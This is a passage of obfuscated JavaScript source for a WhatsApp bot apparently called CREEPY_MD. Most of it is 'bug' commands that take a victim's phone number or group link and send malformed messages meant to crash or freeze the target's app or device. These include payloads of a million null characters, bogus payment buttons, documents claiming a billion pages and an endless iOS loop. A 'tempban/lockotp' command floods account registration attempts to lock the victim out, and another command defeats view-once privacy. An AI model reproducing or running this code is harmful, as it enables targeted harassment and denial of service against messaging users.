            _0x36440f("Where is the link??\n\nExample : " + (_0x2507cf + _0x5ebe26) + " https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps");
          }
          const _0x3be959 = await _0x1b577c.mp4(_0x5a4036);
          const _0x26191b = "\n*" + themeemoji + "Tittle:* " + _0x3be959.title + "\n*" + themeemoji + "Date:* " + _0x3be959.date + "\n*" + themeemoji + "Duration:* " + _0x3be959.duration + "\n*" + themeemoji + "Quality:* " + _0x3be959.quality;
          await _0x2126c8.sendMessage(_0x5cfbb1.chat, {
            'video': {
              'url': _0x3be959.videoUrl
            },
            'caption': _0x26191b
          }, {
            'quoted': _0x5cfbb1
          });
        }
        break;
      case 'sound1':
      case 'sound2':
      case "sound3":
      case "sound4":
      case 'sound5':
      case "sound6":
      case 'sound7':
      case "sound8":
      case "sound9":
      case 'sound10':
      case "sound11":
      case 'sound12':
      case "sound13":
      case "sound14":
      case "sound15":
      case "sound16":
      case "sound17":
      case "sound18":
      case "sound19":
      case 'sound20':
      case "sound21":
      case "sound22":
      case "sound23":
      case "sound24":
      case "sound25":
      case "sound26":
      case "sound27":
      case "sound28":
      case "sound29":
      case 'sound30':
      case "sound31":
      case "sound32":
      case "sound33":
      case "sound34":
      case "sound35":
      case "sound36":
      case 'sound37':
      case 'sound38':
      case "sound39":
      case "sound40":
      case 'sound41':
      case "sound42":
      case 'sound43':
      case "sound44":
      case "sound45":
      case "sound46":
      case "sound47":
      case "sound48":
      case "sound49":
      case 'sound50':
      case "sound51":
      case 'sound52':
      case "sound53":
      case "sound54":
      case "sound55":
      case "sound56":
      case "sound57":
      case "sound58":
      case "sound59":
      case 'sound60':
      case "sound61":
      case 'sound62':
      case "sound63":
      case 'sound64':
      case 'sound65':
      case "sound66":
      case "sound67":
      case "sound68":
      case "sound69":
      case "sound70":
      case 'sound71':
      case "sound72":
      case "sound73":
      case "sound74":
      case 'sound75':
      case "sound76":
      case "sound77":
      case 'sound78':
      case "sound79":
      case "sound80":
      case "sound81":
      case "sound82":
      case "sound83":
      case "sound84":
      case "sound85":
      case 'sound86':
      case "sound87":
      case 'sound88':
      case "sound89":
      case 'sound90':
      case 'sound91':
      case 'sound92':
      case 'sound93':
      case "sound94":
      case "sound95":
      case "sound96":
      case 'sound97':
      case "sound98":
      case 'sound99':
      case "sound100":
      case "sound101":
      case "sound102":
      case "sound103":
      case "sound104":
      case "sound105":
      case "sound106":
      case "sound107":
      case "sound108":
      case "sound109":
      case 'sound110':
      case 'sound111':
      case "sound112":
      case 'sound113':
      case "sound114":
      case "sound115":
      case 'sound116':
      case 'sound117':
      case 'sound118':
      case "sound119":
      case "sound120":
      case "sound121":
      case "sound122":
      case "sound123":
      case "sound124":
      case 'sound125':
      case 'sound126':
      case 'sound127':
      case "sound128":
      case "sound129":
      case "sound130":
      case "sound131":
      case "sound132":
      case "sound133":
      case "sound134":
      case "sound135":
      case "sound136":
      case "sound137":
      case 'sound138':
      case 'sound139':
      case "sound140":
      case "sound141":
      case "sound142":
      case 'sound143':
      case 'sound144':
      case "sound145":
      case "sound146":
      case "sound147":
      case "sound148":
      case "sound149":
      case "sound150":
      case "sound151":
      case 'sound152':
      case "sound153":
      case "sound154":
      case "sound155":
      case "sound156":
      case "sound157":
      case "sound158":
      case "sound159":
      case "sound160":
      case "sound161":
        XeonBotInc_dev = await getBuffer("https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/" + _0x5ebe26 + ".mp3");
        await _0x2126c8.sendMessage(_0x5cfbb1.chat, {
          'audio': XeonBotInc_dev,
          'mimetype': "audio/mp4",
          'ptt': true
        }, {
          'quoted': _0x5cfbb1
        });
        break;
      case "xandroid":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (!_0x5a4036) {
            return _0x36440f("Use " + (_0x2507cf + _0x5ebe26) + " victim number|amount\nExample " + (_0x2507cf + _0x5ebe26) + " 91xxxxxxxxxx,5");
          }
          let _0x36879c = _0x5a4036.split(',')[0x0];
          let _0x42e69a = _0x5a4036.split(',')[0x1] * 0x5;
          if (!_0x36879c || !_0x42e69a) {
            return _0x36440f("Use " + (_0x2507cf + _0x5ebe26) + " victim number|amount\nExample " + (_0x2507cf + _0x5ebe26) + " 91xxxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x42e69a))) {
            return _0x36440f("Amount must be a number");
          }
          let _0x2c8370 = _0x36879c.replace(/[^0-9]/g, '');
          let _0x1d3b6d = '' + encodeURI(_0x42e69a);
          var _0x918c2c = await _0x2126c8.onWhatsApp(_0x2c8370 + "@s.whatsapp.net");
          let _0xed8462 = _0x2c8370 + "@s.whatsapp.net";
          if (_0x2c8370 == "255697608274") {
            return;
          }
          if (_0x918c2c.length == 0x0) {
            return _0x36440f("The number is not registered on WhatsApp");
          }
          _0x36440f("please wait, " + _0x5ebe26 + " bug is in process..");
          await sleep(0x7d0);
          _0x3121c1(_0xed8462, _0x1d3b6d);
          await sleep(0x9c4);
          _0x50a05f("creepy Sent Bug To @" + _0xed8462.split('@')[0x0] + " Using *" + _0x5ebe26 + "* ✅\n\nPause 2 minutes so that creepy is not banned.", [_0xed8462]);
        }
        break;
      case "xios":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (!_0x5a4036) {
            return _0x36440f("Use " + (_0x2507cf + _0x5ebe26) + " victim number|amount\nExample " + (_0x2507cf + _0x5ebe26) + " 255xxxxxxxxxx,5");
          }
          let _0x24442f = _0x5a4036.split(',')[0x0];
          let _0x3e8811 = _0x5a4036.split(',')[0x1] * 0x5;
          if (!_0x24442f || !_0x3e8811) {
            return _0x36440f("Use " + (_0x2507cf + _0x5ebe26) + " victim number|amount\nExample " + (_0x2507cf + _0x5ebe26) + " 255xxxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x3e8811))) {
            return _0x36440f("Amount must be a number");
          }
          let _0x3c76e1 = _0x24442f.replace(/[^0-9]/g, '');
          let _0x28fc59 = '' + encodeURI(_0x3e8811);
          var _0x918c2c = await _0x2126c8.onWhatsApp(_0x3c76e1 + "@s.whatsapp.net");
          let _0x3c0b81 = _0x3c76e1 + '@s.whatsapp.net';
          if (_0x3c76e1 == "255697608274") {
            return;
          }
          if (_0x918c2c.length == 0x0) {
            return _0x36440f("The number is not registered on WhatsApp");
          }
          _0x36440f("please wait, " + _0x5ebe26 + " bug is in process..");
          await sleep(0x7d0);
          _0x582cb9(_0x3c0b81, _0x28fc59);
          await sleep(0x9c4);
          _0x50a05f("creepy Sent Bug To @" + _0x3c0b81.split('@')[0x0] + " Using *" + _0x5ebe26 + "* ✅\n\nPause 2 minutes so that creepy is not banned.", [_0x3c0b81]);
        }
        break;
      case "xios2":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (!_0x2c11b1) {
            return _0x36440f("*This feature is for the bot only!*");
          }
          if (!_0x5a4036) {
            return _0x36440f("Example usage: " + (_0x2507cf + _0x5ebe26) + " 5");
          }
          if (isNaN(parseInt(_0x5a4036))) {
            return _0x36440f("Amount must be a number");
          }
          let _0x494078 = encodeURI(_0x5a4036) * 0xc8;
          _0x36440f("please wait, " + _0x5ebe26 + " creepy bug is in process..");
          await sleep(0x5dc);
          _0x582cb9(_0x496a83, _0x494078);
          await sleep(0x9c4);
          _0x2bd5de('✅');
        }
        break;
      case "xandroid2":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (!_0x2c11b1) {
            return _0x36440f("*This feature is for the creepy only!*");
          }
          if (!_0x5a4036) {
            return _0x36440f("Example usage: " + (_0x2507cf + _0x5ebe26) + " 5");
          }
          if (isNaN(parseInt(_0x5a4036))) {
            return _0x36440f("Amount must be a number");
          }
          let _0xc079f5 = encodeURI(_0x5a4036) * 0xc8;
          _0x36440f("please wait, " + _0x5ebe26 + "creepy bug is in process..");
          await sleep(0x5dc);
          _0x3121c1(_0x496a83, _0xc079f5);
          await sleep(0x9c4);
          _0x2bd5de('✅');
        }
        break;
      case 'xgc':
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (!_0x5a4036) {
            return _0x36440f("*HOW TO SEND BUG TO GROUP*\n\n" + (_0x2507cf + _0x5ebe26) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + _0x5ebe26 + " linkgc amount\n\nExample:\n." + _0x5ebe26 + " https://chat.whatsapp.com/xxxx 10");
          }
          _0x36440f("please wait, " + _0x5ebe26 + " creepy bug is in process..");
          if (!_0x5a4036.split(" ")[0x0].includes("whatsapp.com")) {
            return _0x36440f("Link Invalid!");
          }
          let _0x435052 = _0x5a4036.split(" ")[0x0].split('https://chat.whatsapp.com/')[0x1];
          try {
            let _0x30a2cb = _0x5a4036.split(" ")[0x1] ? _0x5a4036.split(" ")[0x1] : '1';
            let _0x1375f3 = await _0x2126c8.groupAcceptInvite(_0x435052);
            await sleep(0x7d0);
            _0x138f91(_0x1375f3, _0x30a2cb);
            await sleep(0x9c4);
            _0x36440f("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
            _0x2126c8.groupLeave(_0x1375f3);
          } catch (_0x137f3a) {
            _0x36440f(util.format(_0x137f3a));
          }
        }
        break;
      case "khatam":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (!_0x2c11b1) {
            return _0x36440f("*This feature is for the creepy only!*");
          }
          if (!_0x5a4036) {
            return _0x36440f("Example usage: " + (_0x2507cf + _0x5ebe26) + " 5");
          }
          if (isNaN(parseInt(_0x5a4036))) {
            return _0x36440f("Amount must be a number");
          }
          let _0x558349 = encodeURI(_0x5a4036) * 0xc8;
          _0x36440f("please wait, " + _0x5ebe26 + "creepy bug is in process..");
          await sleep(0x5dc);
          _0x138f91(_0x496a83, _0x558349);
          await sleep(0x9c4);
          _0x2bd5de('✅');
        }
        break;
      case "systemuicrash":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (!_0x5a4036) {
            return _0x36440f("Use " + (_0x2507cf + _0x5ebe26) + " victim number|amount\nExample " + (_0x2507cf + _0x5ebe26) + " 255xxxxxxxxxx,5");
          }
          let _0x2dd970 = _0x5a4036.split(',')[0x0];
          let _0x2a6ea5 = _0x5a4036.split(',')[0x1] * 0x5;
          if (!_0x2dd970 || !_0x2a6ea5) {
            return _0x36440f("Use " + (_0x2507cf + _0x5ebe26) + " victim number|amount\nExample " + (_0x2507cf + _0x5ebe26) + " 255xxxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x2a6ea5))) {
            return _0x36440f("Amount must be a number");
          }
          let _0x53d4a4 = _0x2dd970.replace(/[^0-9]/g, '');
          let _0x1e1a55 = '' + encodeURI(_0x2a6ea5);
          var _0x918c2c = await _0x2126c8.onWhatsApp(_0x53d4a4 + "@s.whatsapp.net");
          let _0x10ef26 = _0x53d4a4 + '@s.whatsapp.net';
          if (_0x53d4a4 == "255697608274") {
            return;
          }
          if (_0x918c2c.length == 0x0) {
            return _0x36440f("The number is not registered on WhatsApp");
          }
          _0x36440f("please wait, " + _0x5ebe26 + " creepy bug is in process..");
          await sleep(0x7d0);
          _0x38ccf6(_0x10ef26, _0x1e1a55);
          await sleep(0x9c4);
          _0x50a05f("Successfully Sent Bug To @" + _0x10ef26.split('@')[0x0] + " Using *" + _0x5ebe26 + "* ✅\n\nPause 2 minutes so that cterpy is not banned.", [_0x10ef26]);
        }
        break;
      case "xsysui":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (!_0x5a4036) {
            return _0x36440f("Use " + (_0x2507cf + _0x5ebe26) + " victim number|amount\nExample " + (_0x2507cf + _0x5ebe26) + " 255xxxxxxxxxx,5");
          }
          let _0x220761 = _0x5a4036.split(',')[0x0];
          let _0x186fef = _0x5a4036.split(',')[0x1] * 0x5;
          if (!_0x220761 || !_0x186fef) {
            return _0x36440f("Use " + (_0x2507cf + _0x5ebe26) + " victim number|amount\nExample " + (_0x2507cf + _0x5ebe26) + " 255xxxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x186fef))) {
            return _0x36440f("Amount must be a number");
          }
          let _0x3ac11a = _0x220761.replace(/[^0-9]/g, '');
          let _0x546897 = '' + encodeURI(_0x186fef);
          var _0x918c2c = await _0x2126c8.onWhatsApp(_0x3ac11a + "@s.whatsapp.net");
          let _0x600887 = _0x3ac11a + "@s.whatsapp.net";
          if (_0x3ac11a == '255697608274') {
            return;
          }
          if (_0x918c2c.length == 0x0) {
            return _0x36440f("The number is not registered on WhatsApp");
          }
          _0x36440f("please wait, " + _0x5ebe26 + "creepy bug is in process..");
          await sleep(0x7d0);
          _0x5b8869(_0x600887, _0x546897);
          await sleep(0x9c4);
          _0x50a05f("Successfully Sent Bug To @" + _0x600887.split('@')[0x0] + " Using *" + _0x5ebe26 + "* ✅\n\nPause 2 minutes so that creepy is not banned.", [_0x600887]);
        }
        break;
      case "oneshot":
        {
          if (!_0x4fbeb2) {
            return _0x36440f(mess.owner);
          }
          if (!_0x5a4036) {
            return _0x36440f("Usage ." + _0x5ebe26 + " 2556******74");
          }
          let _0x2628fa = _0x5a4036.replace(/[^0-9]/g, '');
          if (_0x2628fa.startsWith('0')) {
            return _0x36440f("Example : " + (_0x2507cf + _0x5ebe26) + " 2556******74");
          }
          var _0x918c2c = await _0x2126c8.onWhatsApp(_0x2628fa + "@s.whatsapp.net");
          let _0x39713a = _0x2628fa + "@s.whatsapp.net";
          if (_0x2628fa == "255697608274") {
            return;
          }
          if (_0x2628fa == "255697608274") {
            return;
          }
          if (_0x2628fa == "255697608274") {
            return;
          }
          if (_0x918c2c.length == 0x0) {
            return _0x36440f("The number is not registered on WhatsApp");
          }
          async function _0x40c370(_0x163201) {
            for (let _0x236f77 = '3'; _0x236f77 !== 0x0; _0x236f77 -= 0x1) {}
            for (let _0x57dd7c = '3'; _0x57dd7c !== 0x0; _0x57dd7c -= 0x1) {
              await _0x2126c8.relayMessage(_0x163201, {
                'viewOnceMessage': {
                  'message': {
                    'messageContextInfo': {
                      'deviceListMetadataVersion': 0x2,
                      'deviceListMetadata': {}
                    },
                    'interactiveMessage': {
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': 'payment_info',
                          'buttonParamsJson': "{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"🤖Danny praiay\",\"key\":\"+916909137213\",\"key_type\":\"X\"}}]}"
                        }]
                      }
                    }
                  }
                }
              }, {
                'participant': {
                  'jid': _0x163201
                }
              }, {
                'messageId': null
              });
            }
            for (let _0x204c4a = '3'; _0x204c4a !== 0x0; _0x204c4a -= 0x1) {
              await _0x2126c8.relayMessage(_0x163201, {
                'viewOnceMessage': {
                  'message': {
                    'interactiveMessage': {
                      'header': {
                        'title': '',
                        'subtitle': " "
                      },
                      'body': {
                        'text': "🇹🇿Danny praisy 🇹🇿Danny praisy 🇹🇿Danny praisy"
                      },
                      'footer': {
                        'text': 'xp'
                      },
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': "cta_url",
                          'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }"
                        }],
                        'messageParamsJson': "\0".repeat(0xf4240)
                      }
                    }
                  }
                }
              }, {
                'participant': {
                  'jid': _0x163201
                }
              });
            }
          }
          await _0x36440f("creepy In process....");
          await _0x40c370(_0x39713a);
          _0x50a05f("Successfully Sent Bug To @" + _0x39713a.split('@')[0x0] + " Using *" + _0x5ebe26 + "* ✅\n\nPause 2 minutes so that creepy is not banned.", [_0x39713a]);
        }
        break;
      case "xpayment":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (!_0x5a4036) {
            return _0x36440f("Usage ." + _0x5ebe26 + " 2556******74");
          }
          let _0x53e38d = _0x5a4036.replace(/[^0-9]/g, '');
          if (_0x53e38d.startsWith('0')) {
            return _0x36440f("Example : " + (_0x2507cf + _0x5ebe26) + " 2556******74");
          }
          var _0x918c2c = await _0x2126c8.onWhatsApp(_0x53e38d + "@s.whatsapp.net");
          let _0x1a7ddf = _0x53e38d + '@s.whatsapp.net';
          if (_0x53e38d == "255697608274") {
            return;
          }
          if (_0x53e38d == "255697608274") {
            return;
          }
          if (_0x53e38d == "255697608274") {
            return;
          }
          if (_0x918c2c.length == 0x0) {
            return _0x36440f("The number is not registered on WhatsApp");
          }
          async function _0x28088a(_0x5f29f4) {
            await _0x2126c8.relayMessage(_0x5f29f4, {
              'viewOnceMessage': {
                'message': {
                  'messageContextInfo': {
                    'deviceListMetadataVersion': 0x2,
                    'deviceListMetadata': {}
                  },
                  'interactiveMessage': {
                    'nativeFlowMessage': {
                      'buttons': [{
                        'name': 'payment_info',
                        'buttonParamsJson': "{\"currency\":\"INR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"meu ovo\",\"key\":\"+916909137213\",\"key_type\":\"X\"}}]}"
                      }]
                    }
                  }
                }
              }
            }, {
              'participant': {
                'jid': _0x5f29f4
              }
            }, {
              'messageId': null
            });
          }
          await _0x28088a(_0x1a7ddf);
          _0x50a05f("Successfully Sent Bug To @" + _0x1a7ddf.split('@')[0x0] + " Using *" + _0x5ebe26 + "* ✅\n\nPause 2 minutes so that creepy is not banned.", [_0x1a7ddf]);
        }
        break;
      case "onekill":
      case "oneclickall":
      case "xsamsung":
      case "xwaweb":
      case "doublekill":
      case '🤖':
      case "triplekill":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (!q) {
            return _0x36440f("Usage ." + _0x5ebe26 + " 2556******74");
          }
          let _0x299667 = q.replace(/[^0-9]/g, '');
          if (_0x299667.startsWith('0')) {
            return _0x36440f("Example : ." + _0x5ebe26 + " 2556******74");
          }
          let _0x5be6a6 = _0x299667 + '@s.whatsapp.net';
          await _0x36440f("In process....");
          for (let _0x34fc8d = 0x0; _0x34fc8d < 0x1; _0x34fc8d++) {
            await _0x2f5165(_0x5be6a6, _0x5a2320);
            await _0x3cfec1(_0x5be6a6, _0x4c3be9);
            await _0x572f91(_0x5be6a6, _0x5a2320);
            await _0x3cfec1(_0x5be6a6, _0x4c3be9);
            await _0x3117f6(_0x5be6a6, _0x34ada6);
            await _0x3cfec1(_0x5be6a6, _0x4c3be9);
          }
          await _0x36440f("Successfully Send Bug to " + _0x299667 + " Using " + _0x5ebe26 + ". ✅");
        }
        break;
      case "ioskill":
      case "iosx":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          let _0xa91b41 = q.replace(/[^0-9]/g, '');
          if (_0xa91b41.startsWith('0')) {
            return _0x36440f("Example : ." + _0x5ebe26 + " 2556******74");
          }
          await _0x36440f("In process....");
          let _0x301de3 = _0xa91b41 + "@s.whatsapp.net";
          for (;;) {
            await _0xa1b913(_0x301de3);
            await sleep(0x4b0);
          }
        }
        break;
      case 'xfreeze':
      case "xblankscrn":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          const _0x1efc25 = {
            'url': "./69/x.mp3"
          };
          async function _0x266934(_0x549785) {
            for (let _0x326088 = 0x0; _0x326088 < 0x32; _0x326088++) {
              await _0x2126c8.sendMessage(_0x549785, {
                'document': _0x1efc25,
                'fileName': "🇹🇿Danny Praisy" + xeontext1,
                'mimetype': "application/zip",
                'caption': "🇹🇿Danny Praisy" + xeontext1,
                'pageCount': 0x3b9aca00,
                'contactVcard': true
              });
            }
          }
          await _0x266934(_0x5cfbb1.chat);
        }
        break;
      case 'xkillgc':
      case "xblankscrn":
      case "xwebgc":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          const _0x5d452e = {
            'title': "🇹🇿Danny Praisy; ",
            'hasMediaAttachment': true,
            'imageMessage': thumb.imageMessage
          };
          const _0x47e81e = {
            'text': ''
          };
          _0x2126c8.relayMessage(_0x5cfbb1.chat, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': _0x5d452e,
                  'body': _0x47e81e,
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "galaxy_message",
                      'buttonParamsJson': JSON.stringify({
                        'header': "🇹🇿Danny Praiay; ",
                        'body': "xxx",
                        'flow_action': "navigate",
                        'flow_action_payload': {
                          'screen': "FORM_SCREEN"
                        },
                        'flow_cta': 'xxxxx',
                        'flow_id': "1169834181134583",
                        'flow_message_version': '3',
                        'flow_token': "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                      })
                    }],
                    'messageParamsJson': ''
                  },
                  'contextInfo': {
                    'isForwarded': true,
                    'fromMe': false,
                    'participant': "0@s.whatsapp.net",
                    'remoteJid': _0x5cfbb1.chat,
                    'quotedMessage': {
                      'documentMessage': {
                        'url': "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                        'mimetype': 'application/pdf',
                        'title': "crash",
                        'pageCount': 0x3b9aca00,
                        'fileName': "crash.pdf",
                        'contactVcard': true
                      }
                    },
                    'forwardedNewsletterMessageInfo': {
                      'newsletterJid': "120363222395675670@newsletter",
                      'serverMessageId': 0x1,
                      'newsletterName': "🇹🇿Danny Praisy"
                    }
                  }
                }
              }
            }
          }, {});
        }
        break;
      case "xiosfreeze":
      case "xioshot":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          const _0x384ab1 = {
            'key': {
              'fromMe': false,
              'participant': "0@s.whatsapp.net",
              'remoteJid': "status@broadcast"
            },
            'message': {
              'listResponseMessage': {
                'title': "Xeon's ur father"
              }
            }
          };
          async function _0x3aaa62(_0x45c693, _0x135a11, _0xddc740) {
            _0x2126c8.sendMessage(_0x135a11, {
              'document': {
                'url': "./settings.js"
              },
              'mimetype': "image/null",
              'fileName': "🇹🇿Danny Praiay" + xeontext11,
              'caption': "🇹🇿Danny Praisy " + xeontext11
            }, {
              'quoted': {
                ..._0x384ab1,
                'key': {
                  ..._0x384ab1.key,
                  'participant': _0xddc740
                }
              }
            });
          }
          async function _0x803a8e() {
            if (!_0x4f8c4e[0x0]) {
              amount = '99';
            }
            for (let _0x36cbe3 = 0x1; _0x36cbe3 < 0xa; _0x36cbe3++) {
              _0x3aaa62(_0x1d4e1b, _0x5cfbb1.chat, _0x5454c7);
            }
          }
          await _0x803a8e();
        }
        break;
      case "lockotp":
      case 'tempban':
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("Incorrect format\n\nUsage: " + (_0x2507cf + _0x5ebe26) + " country_code|number\nExample: " + (_0x2507cf + _0x5ebe26) + " 91|6909137213");
          }
          const _0x4b9a6c = _0x4f8c4e[0x0].split('|');
          if (_0x4b9a6c.length !== 0x2) {
            return _0x36440f("Incorrect format\n\nUsage: " + (_0x2507cf + _0x5ebe26) + " country_code|number\nExample: " + (_0x2507cf + _0x5ebe26) + " 91|6909137213");
          }
          const _0x314ce6 = _0x4b9a6c[0x0];
          const _0x1203a5 = _0x4b9a6c[0x1];
          const _0x53bf46 = '' + _0x314ce6 + _0x1203a5;
          const _0x28874d = _0x53bf46 + "@s.whatsapp.net";
          _0x50a05f("creepy Activated OTP LOCK To @" + _0x28874d.split('@')[0x0] + " Using *" + _0x5ebe26 + "* ✅\n\nPause 2 minutes so that creepy is not banned.", [_0x28874d]);
          try {
            const {
              stateXeon: _0x4f786a,
              saveCredsXeon: _0x1ce2af
            } = await useMultiFileAuthState("./session");
          } catch (_0x5b4260) {}
          for (let _0x4cda9a = 0x0; _0x4cda9a < 0x2710; _0x4cda9a++) {
            try {
              var _0x454adc = Math.floor(Math.random() * 0x3e7);
              var _0xae2132 = Math.floor(Math.random() * 0x3e7);
              await _0x2126c8.register(_0x454adc + '-' + _0xae2132);
            } catch (_0x3fd68b) {
              console.log(_0x454adc + '-' + _0xae2132);
            }
          }
        }
        break;
      case 'vv':
      case 'rvo':
        {
          if (!_0x5cfbb1.quoted) {
            return _0x36440f("Reply to view once message");
          }
          if (_0x5cfbb1.quoted.mtype !== "viewOnceMessageV2") {
            return _0x36440f("This is not a view once message");
          }
          let _0x3f18ff = _0x5cfbb1.quoted.message;
          let _0x1aaf47 = Object.keys(_0x3f18ff)[0x0];
          let _0x20c279 = await downloadContentFromMessage(_0x3f18ff[_0x1aaf47], _0x1aaf47 == "imageMessage" ? 'image' : "video");
          let _0x1dd311 = Buffer.from([]);
          for await (const _0x23dea1 of _0x20c279) {
            _0x1dd311 = Buffer.concat([_0x1dd311, _0x23dea1]);
          }
          if (/video/.test(_0x1aaf47)) {
            return _0x2126c8.sendFile(_0x5cfbb1.chat, _0x1dd311, "media.mp4", _0x3f18ff[_0x1aaf47].caption || '', _0x5cfbb1);
          } else {
            if (/image/.test(_0x1aaf47)) {
              return _0x2126c8.sendFile(_0x5cfbb1.chat, _0x1dd311, "media.jpg", _0x3f18ff[_0x1aaf47].caption || '', _0x5cfbb1);
            }
          }
        }
        break;
      case "clearchat":
        _0x17cf09("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
        break;
      case "menu":
      case "Danny":
      case 'alive':
      case 'felix':
      case "allmenu":
        let _0x39525e = "╭══ *☆° CREEPY_MD °☆*\n┃♤ *ᴏᴡɴᴇʀ:* `♡Danny&Praise♡`\n┃☆● *ᴜᴘᴛɪᴍᴇ:* " + runtime(process.uptime()) + "\n┃¤ *User:* " + _0x1d4e1b + "\n " + xeonytimewisher + " 👌My FRIEND\n🤖🤖 `Don't forget to follow` \n*CREEPY TECHNOLOGY* `whatsapp Channel` 🤖🤖\n🔗 https://whatsapp.com/channel/0029VacQFw65Ui2gGv0Kwk1r\n╰═══danny════praisy══════⊷\n 📵ʙᴜɢs ᴀɴᴅʀᴏɪᴅ📵\n> xandroid \n> xandroid2\n> systemuicrash\n> xsysui\n> xpayment\n> oneshot\n> onekill\n> xfreeze\n> khatam\n\n ʙᴜɢ ᴡᴇʙ\n> xfreeze\n> xblankscrn\n> xwebgc\n\n ʙᴜɢ ɪᴏꜱ\n> xios\n> xios2\n> ioskill\n> xiosfreeze\n> xioshot\n\n ʙᴜɢ ᴏᴛʜᴇʀ📴📴\n> tempban\n> lockotp\n\n ʙᴜɢ ɢʀᴏᴜᴘ ᴄʜᴀᴛ📴📴\n> webgc🔥\n> androgc🔥\n> iosgc🔥\n> xjpmgc🔥\n\n ᴏᴡɴᴇʀ ᴍᴇɴᴜ🌕🌕\n> getsession\n> deletesession\n> join\n> shutdown  \n> restart\n> autoread *[on/off]*\n> autotyping *[on/off]*\n> autorecording *[on/off]*\n> autorecordtyp *[on/off]*\n> autobio *[option]*\n> autoswview *[option]*\n> mode *[option]*\n> block\n> unblock \n> backup\n> getcase\n> addowner\n> delowner\n> bcgc\n\n ɢʀᴏᴜᴘ ᴍᴇɴᴜ🛑🛑\n> closetime\n> opentime\n> kick\n> add\n> promote\n> demote\n> setdesc\n> setppgc\n> tagall\n> hidetag\n> totag\n> group *[option]*\n> editinfo\n> linkgc\n> revoke\n> listonline\n\n ᴍᴀɪɴ ᴍᴇɴᴜ🕎\n> menu\n> buypremium\n> runtime\n> script\n> donate\n> owner\n\n ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ🔄🔄\n> sticker\n> smeme\n> take\n> toimage\n> tovideo\n> toaudio\n> tomp3\n> tovn\n> togif\n> tourl\n> toqr\n> toviewonce\n> fliptext\n> emojimix\n\n ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ⚧️⚧️\n> addvideo\n> addimage\n> addsticker\n> addvn\n> addzip\n> addapk\n> addpdf\n> delvideo\n> delimage\n> delsticker\n> delvn\n> delzip\n> delapk\n> delpdf\n> listvideo\n> listimage\n> liststicker\n> listvn\n> listzip\n> listapk\n> listpdf\n\n ᴅᴏᴡɴ ᴍᴇɴᴜ⏬️⏬️\n> play\n> telestick\n> ytmp3\n> ytmp4\n> sound1 - sound161\n\npowered by *Danny* & *Praisy*\n\n©️Danny<2024> *creepy teachnology*";
        if (typemenu === 'v1') {
          _0x2126c8.sendMessage(_0x5cfbb1.chat, {
            'text': _0x39525e,
            'contextInfo': {
              'externalAdReply': {
                'title': botname,
                'body': ownername,
                'thumbnailUrl': "https://imgur.com/a/AApdZU4.jpeg",
                'sourceUrl': link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x5cfbb1
          });
        } else {
          if (typemenu === 'v2') {
            _0x2126c8.sendMessage(_0x5cfbb1.chat, {
